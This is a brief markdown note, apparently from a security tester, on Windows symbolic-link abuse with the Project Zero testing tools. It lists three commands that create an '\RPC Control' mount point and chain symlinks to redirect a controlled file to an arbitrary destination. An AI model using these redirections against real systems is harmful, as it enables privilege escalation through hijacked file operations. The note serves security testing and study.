# Notes for Symlinking
- https://github.com/googleprojectzero/symboliclink-testing-tools

#### Create a mount point to RPC Control (Source folder must be empty)
```CreateMountPoint.exe "C:\Source\Folder" "\RPC Control"```
#### Point the file we control to RPC Control
```CreateSymlink.exe "C:\Source\Folder\filename.txt" "\RPC Control\pwn"```
#### Create a Symlink from RPC Control pointing to the new destination and new filename.
```CreateSymlink.exe "\RPC Control\pwn" "C:\Destination\Folder\newfilename.txt"```
